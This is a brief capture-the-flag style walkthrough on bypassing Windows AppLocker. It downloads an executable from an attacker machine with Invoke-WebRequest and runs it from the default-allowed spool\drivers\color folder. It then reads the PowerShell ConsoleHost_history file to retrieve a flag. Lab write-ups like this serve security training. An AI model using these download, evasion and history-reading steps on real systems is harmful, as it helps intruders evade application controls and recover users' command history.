Walkthrough
===========
TASK - 1
---------
1. in my attackbox run a simplehttp server

2. in target's powershell:-
(To transfer our demo exe file into target's system)
PS C:\Users\dark> $URL = "http://10.18.1.224:9000/ternaryif.exe"
PS C:\Users\dark> $PATH = "C:\Users\dark\ternaryif.exe"
PS C:\Users\dark> Invoke-WebRequest -URI $URL -OutFile $PATH

3. now exit from powershell

4. ./ternaryif.exe
It does not run. Because of Applock policy.
So we have to bypass it

5. copy the file into 
C:\Windows\System32\spool\drivers\color 

this directory is whitelisted by default. (A curated list is attached in this repository)

6. now we can be able to run the executable.

7. To access the flag we are instructed to check powershell history(It is named as ConsoleHost History)
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

8. type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
(got the flag)
